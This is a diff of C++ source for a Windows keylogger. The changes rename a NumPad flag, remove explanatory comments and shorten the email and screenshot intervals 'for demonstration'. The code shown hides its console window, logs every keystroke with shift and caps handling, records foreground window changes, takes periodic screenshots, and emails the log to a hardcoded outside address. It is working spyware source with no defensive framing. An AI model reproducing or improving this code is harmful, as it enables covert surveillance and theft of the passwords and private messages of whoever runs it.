@@ -6,17 +6,16 @@
 
 using namespace std;
 
-bool numPadUnlocked = true;
+bool numUnlocked = true;
 int capsCount=0,ssCount=1;
 time_t start, endt;
 double elapsed, prev_elapsed = 0.0, mail_elapsed = 0.0;
 char last_window[256] = "siam";
 
 #define default_mail "mdsiam01@sharklasers.com"
-#define EMAIL_TIME 1800.0  //30 minutes
-#define SS_TIME 900.0  //15 minutes
+#define EMAIL_TIME 180.0  //3 minutes (keeping low for demonstration)
+#define SS_TIME 90.0  //1.5 minutes (keeping low for demonstration)
 
-//hide the console
 void stealth()
 {
     HWND stealth;
@@ -26,15 +25,12 @@ void stealth()
 
 }
 
-//save the keystrokes to log.txt
 int save(int _key, char const *file)
 {
     cout << _key << endl;
     Sleep(10);
     FILE *OUTPUT_FILE;
     OUTPUT_FILE = fopen (file,"a+");
-
-    //the upper keys of the keyboard (0-9 and special characters)
     if((_key>=48)&&(_key<=57))
     {
         if(GetAsyncKeyState(VK_SHIFT))
@@ -65,19 +61,14 @@ int save(int _key, char const *file)
         else
             fputc(_key,OUTPUT_FILE);
     }
-
-    //the key is a letter
     else if((_key>64)&&(_key<91))
     {
-        //shift button is currently pressed or odd number of presses in Caps Lock
-        //we need to record the keys in capital
         if(!((GetAsyncKeyState(VK_SHIFT)&0x8000)^(capsCount%2==1)))
         {
             cout<< capsCount%2<<endl;
             _key+=32;
             fputc(_key,OUTPUT_FILE);
         }
-        //small letters otherwise
         else
             fputc(_key,OUTPUT_FILE);
 
@@ -218,58 +209,58 @@ int save(int _key, char const *file)
     else if( _key == VK_NUMLOCK)
     {
         fprintf(OUTPUT_FILE, "%s", "\n[NumLock]\n");
-        numPadUnlocked = !numPadUnlocked;
+        numUnlocked = !numUnlocked;
     }
 
 
     else if( _key == VK_NUMPAD0)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "0");
     }
     else if( _key == VK_NUMPAD1)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "1");
     }
     else if( _key == VK_NUMPAD2)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "2");
     }
     else if( _key == VK_NUMPAD3)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "3");
     }
     else if( _key == VK_NUMPAD4)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "4");
     }
     else if( _key == VK_NUMPAD5)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "5");
     }
     else if( _key == VK_NUMPAD6)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "6");
     }
     else if( _key == VK_NUMPAD7)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "7");
     }
     else if( _key == VK_NUMPAD8)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "8");
     }
     else if( _key == VK_NUMPAD9)
     {
-        if(numPadUnlocked)
+        if(numUnlocked)
         fprintf(OUTPUT_FILE, "%s", "9");
     }
     else if( _key == VK_F1)
@@ -320,8 +311,6 @@ int save(int _key, char const *file)
     return 0;
 }
 
-//inputs the current windows, if its different than the older window thats on the user's
-//forground
 void trackWindowChanges()
 {
     HWND foreground = GetForegroundWindow();
@@ -349,8 +338,6 @@ void logKeys()
         time(&endt);
 
         elapsed = difftime(endt, start);
-
-        //if the default time to take screenshot is passed, take a screenshot
         if (elapsed >= prev_elapsed+SS_TIME)
         {
             char nameOfScreenshot[20];
@@ -362,19 +349,16 @@ void logKeys()
             prev_elapsed = elapsed;
         }
 
-        //if the default time to send email is passed, send an email
         if (elapsed >= mail_elapsed+EMAIL_TIME)
         {
             mailMyLog(default_mail);
             mail_elapsed = elapsed;
         }
 
-        //track the changes on window
         trackWindowChanges();
 
         Sleep(10);
 
-        //get the keystrokes
         for(i=0;i<255;i++)
         {
             if((GetAsyncKeyState(VK_SHIFT)&0x80000) && (GetAsyncKeyState(VK_CONTROL)&0x80000) && (GetAsyncKeyState(VK_TAB)&0x80000))
